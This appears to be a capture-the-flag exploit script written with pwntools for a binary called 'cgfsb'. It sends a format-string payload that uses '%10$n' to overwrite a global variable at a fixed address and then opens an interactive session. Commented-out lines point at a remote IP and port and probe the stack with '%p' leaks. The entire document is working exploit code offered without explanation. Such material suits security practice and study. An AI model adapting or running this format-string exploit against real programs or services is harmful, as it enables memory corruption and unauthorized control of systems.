from pwn import *
p = process("./cgfsb")
#h,p = '111.200.241.244',53175
#p = remote(h,p)
pwnme = 0x804a068
#context.log_level = "debug"
#gdb.attach("cgfsb")
p.sendlineafter("name:","AB")
#leak = "AAAA"+"%p."*10
#p.sendlineafter("please:",leak)
exp = p32(pwnme)+"AAAA%10$n"
p.sendlineafter("please:",exp)
p.interactive()
